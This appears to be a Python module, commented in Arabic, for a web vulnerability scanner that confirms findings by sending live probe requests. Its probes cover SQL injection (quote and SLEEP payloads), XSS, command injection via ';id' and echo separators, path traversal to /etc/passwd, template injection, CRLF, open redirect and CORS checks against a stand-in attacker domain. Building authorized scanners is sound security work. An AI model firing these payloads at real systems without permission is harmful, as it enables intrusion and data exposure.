"""محرّك تأكيد نشط لثغرات الويب — بلا LLM.

لكل صنف ثغرة مؤكِّد يرسل طلبًا حقيقيًا (بجلسة مُصادَقة) ويتحقّق من إشارة موثوقة:
  confirmed    — ثبتت الثغرة فعليًا (إشارة قاطعة).
  unconfirmed  — اختُبرت ولم تظهر الإشارة (غالبًا إيجابي كاذب).
  manual       — لا يمكن تأكيدها بطلب واحد حتميًا (تحتاج تحقّقًا يدويًا/OAST).
  error        — تعذّر الاتصال.

العميل (probe) يُحقَن ليبقى المنطق قابلًا للاختبار بلا شبكة. يُشغَّل على أهداف
مصرّح بها فقط.
"""

from __future__ import annotations

import re
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from urllib.parse import parse_qs, urlencode, urlsplit, urlunsplit

MARK = "IQ9173"  # علامة فريدة نتحقّق من انعكاسها


@dataclass
class Verdict:
    status: str          # confirmed | unconfirmed | manual | error
    signal: str = ""     # وصف الإشارة القاطعة


# ── أدوات مساعدة ──
def first_param(endpoint: str | None) -> str | None:
    if not endpoint:
        return None
    q = parse_qs(urlsplit(endpoint).query, keep_blank_values=True)
    return next(iter(q), None)


def inject(url: str, param: str, value: str) -> str:
    """يستبدل قيمة بارامتر في الرابط (أو يضيفه) — يُعيد الرابط الجديد."""
    p = urlsplit(url)
    q = parse_qs(p.query, keep_blank_values=True)
    q[param] = [value]
    newq = urlencode({k: v[-1] for k, v in q.items()})
    return urlunsplit((p.scheme, p.netloc, p.path, newq, ""))


# أخطاء قواعد بيانات شائعة — دليل SQLi.
_SQL_ERR = re.compile(
    r"SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|SQLite3?::|"
    r"Unclosed quotation mark|quoted string not properly terminated|"
    r"Warning: mysqli|supplied argument is not a valid MySQL",
    re.IGNORECASE,
)
_PASSWD = re.compile(r"root:.*?:0:0:")


# ── المؤكِّدات (كل واحد: probe, url, param) -> Verdict ──
def confirm_sqli(probe, url, param):
    if not param:
        return Verdict("manual", "لا بارامتر لحقنه")
    # 1) خطأ قاعدة بيانات (error-based)
    r = probe.get(inject(url, param, "1'\""))
    if r and _SQL_ERR.search(r.text or ""):
        return Verdict("confirmed", "خطأ SQL ظهر مع محرف اقتباس")
    # 2) زمني (time-based) — SLEEP مقابل خطّ أساس
    base = probe.get(inject(url, param, "1"))
    inj = probe.get(inject(url, param, "1' AND SLEEP(5)-- -"))
    if base and inj and (inj.elapsed - base.elapsed) >= 4.0:
        return Verdict("confirmed", f"تأخّر زمني {inj.elapsed - base.elapsed:.1f}s مع SLEEP")
    return Verdict("unconfirmed", "لا خطأ ولا تأخّر زمني")


def confirm_xss(probe, url, param):
    if not param:
        return Verdict("manual", "لا بارامتر لحقنه")
    payload = f"<svg/onload=confirm({MARK})>"
    r = probe.get(inject(url, param, payload))
    if r and payload in (r.text or ""):          # انعكس بلا ترميز
        return Verdict("confirmed", "الحمولة انعكست غير مُرمَّزة في الاستجابة")
    return Verdict("unconfirmed", "لم تنعكس الحمولة غير مُرمَّزة")


def confirm_cmdi(probe, url, param):
    if not param:
        return Verdict("manual", "لا بارامتر لحقنه")
    token = f"IQC{MARK}X"
    for sep in (";echo %s", "|echo %s", "&&echo %s", "`echo %s`"):
        r = probe.get(inject(url, param, sep % token))
        if r and token in (r.text or ""):
            return Verdict("confirmed", "صدى الأمر echo ظهر في الاستجابة")
    r = probe.get(inject(url, param, ";id"))
    if r and re.search(r"uid=\d+", r.text or ""):
        return Verdict("confirmed", "مخرجات id (uid=) ظهرت")
    return Verdict("unconfirmed", "لم يظهر صدى تنفيذ أمر")


def confirm_lfi(probe, url, param):
    if not param:
        return Verdict("manual", "لا بارامتر لحقنه")
    for pl in ("../../../../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd"):
        r = probe.get(inject(url, param, pl))
        if r and _PASSWD.search(r.text or ""):
            return Verdict("confirmed", "محتوى /etc/passwd ظهر")
    return Verdict("unconfirmed", "لم يظهر محتوى ملف نظام")


def confirm_ssti(probe, url, param):
    if not param:
        return Verdict("manual", "لا بارامتر لحقنه")
    # 1337*1337 = 1787569 — ناتج فريد يصعب ظهوره صدفة.
    for pl in ("{{1337*1337}}", "${1337*1337}", "<%= 1337*1337 %>", "#{1337*1337}"):
        r = probe.get(inject(url, param, pl))
        if r and "1787569" in (r.text or ""):
            return Verdict("confirmed", "قُيّم تعبير القالب (1337*1337=1787569)")
    return Verdict("unconfirmed", "لم يُقيَّم تعبير القالب")


def confirm_open_redirect(probe, url, param):
    param = param or "url"
    evil = "https://iq9173-evil.example"
    r = probe.get(inject(url, param, evil), allow_redirects=False)
    loc = (r.headers.get("location", "") if r else "")
    if loc and ("iq9173-evil.example" in loc):
        return Verdict("confirmed", f"Location يشير لنطاق خارجي: {loc}")
    return Verdict("unconfirmed", "لا تحويل لنطاق خارجي يتحكّم به المهاجم")


def confirm_crlf(probe, url, param):
    if not param:
        return Verdict("manual", "لا بارامتر لحقنه")
    r = probe.get(inject(url, param, f"%0d%0aIQCRLF:{MARK}"))
    if r and r.headers.get("iqcrlf"):
        return Verdict("confirmed", "تم حقن ترويسة استجابة (CRLF)")
    return Verdict("unconfirmed", "لم تُحقَن ترويسة")


def confirm_cors(probe, url, param):
    evil = "https://iq9173-evil.example"
    r = probe.get(url, headers={"Origin": evil})
    if not r:
        return Verdict("error", "تعذّر الاتصال")
    acao = r.headers.get("access-control-allow-origin", "")
    acac = r.headers.get("access-control-allow-credentials", "")
    if acao == evil or acao == "*":
        extra = " مع credentials" if acac.lower() == "true" else ""
        return Verdict("confirmed", f"ACAO يعكس أصلًا خارجيًا ({acao}){extra}")
    return Verdict("unconfirmed", "لا انعكاس لأصل خارجي في CORS")


def confirm_dirlist(probe, url, param):
    r = probe.get(url)
    if r and re.search(r"<title>Index of /|Directory listing for", r.text or "", re.IGNORECASE):
        return Verdict("confirmed", "صفحة سرد مجلد مكشوفة")
    return Verdict("unconfirmed", "لا سرد مجلد")


# أصناف تحتاج حالة/حسابين/OAST — لا تُؤكَّد بطلب واحد حتميًا.
def confirm_manual(probe, url, param):
    return Verdict("manual", "يحتاج تحقّقًا يدويًا (حالة/حسابان/OAST)")


# التسجيل: كلمات مفتاحية (بالنوع) -> مؤكِّد. أول تطابق يفوز.
REGISTRY: list[tuple[tuple[str, ...], object]] = [
    (("sql", "sqli"), confirm_sqli),
    (("command", "cmd", "os command", "rce", "code execution"), confirm_cmdi),
    (("ssti", "template injection"), confirm_ssti),
    (("lfi", "local file", "path traversal", "directory traversal", "file inclusion"), confirm_lfi),
    (("xss", "cross site script", "cross-site script"), confirm_xss),
    (("open redirect", "redirect"), confirm_open_redirect),
    (("crlf", "header injection", "response splitting"), confirm_crlf),
    (("cors",), confirm_cors),
    (("directory listing", "dir listing", "index of"), confirm_dirlist),
    # أصناف يدوية صريحة:
    (("ssrf", "idor", "insecure direct object", "csrf", "xxe", "auth", "business logic",
      "privilege", "race condition", "deserial"), confirm_manual),
]


def pick_confirmer(vuln_type: str | None):
    vt = (vuln_type or "").lower()
    for keywords, fn in REGISTRY:
        if any(k in vt for k in keywords):
            return fn
    return None


def confirm_finding(probe, vuln_type, host, endpoint, evidence=None) -> Verdict:
    """يختار المؤكِّد المناسب ويشغّله على النتيجة."""
    from api.services.poc import _parse_evidence  # إعادة استخدام استخراج البارامتر

    fn = pick_confirmer(vuln_type)
    if fn is None:
        return Verdict("manual", "لا مؤكِّد لهذا النوع")
    url = endpoint or (host if host and "://" in host else (f"http://{host}" if host else ""))
    if not url:
        return Verdict("manual", "لا endpoint")
    param, _payload = _parse_evidence(evidence)
    if not param:
        param = first_param(endpoint)
    try:
        return fn(probe, url, param)
    except Exception as exc:
        return Verdict("error", str(exc)[:120])


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


class HttpProbe:
    """عميل HTTP حتمي للتأكيد — يُرجِع الحالة والترويسات والنصّ والزمن (stdlib)."""

    class Resp:
        def __init__(self, status, headers, text, elapsed):
            self.status = status
            self.headers = {k.lower(): v for k, v in headers}
            self.text = text
            self.elapsed = elapsed

    def __init__(self, cookie_header: str = "", timeout: int = 20):
        self.cookie = cookie_header
        self.timeout = timeout
        self._op = urllib.request.build_opener()
        self._nop = urllib.request.build_opener(_NoRedirect)

    def _do(self, req, allow_redirects):
        op = self._op if allow_redirects else self._nop
        t0 = time.monotonic()
        try:
            with op.open(req, timeout=self.timeout) as r:  # noqa: S310 (هدف مصرّح به)
                body = r.read().decode("utf-8", "replace")
                return HttpProbe.Resp(getattr(r, "status", 0), list(r.headers.items()), body, time.monotonic() - t0)
        except urllib.error.HTTPError as e:   # 3xx/4xx/5xx — نلتقط الترويسات والجسم
            body = ""
            try:
                body = e.read().decode("utf-8", "replace")
            except Exception:
                pass
            headers = list(e.headers.items()) if e.headers else []
            return HttpProbe.Resp(e.code, headers, body, time.monotonic() - t0)

    def _headers(self, extra):
        h = {"User-Agent": "IQScan-Confirm"}
        if self.cookie:
            h["Cookie"] = self.cookie
        if extra:
            h.update(extra)
        return h

    def get(self, url, headers=None, allow_redirects=True):
        req = urllib.request.Request(url, headers=self._headers(headers))
        return self._do(req, allow_redirects)

    def post(self, url, data, headers=None):
        body = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(url, data=body, headers=self._headers(headers))
        return self._do(req, True)
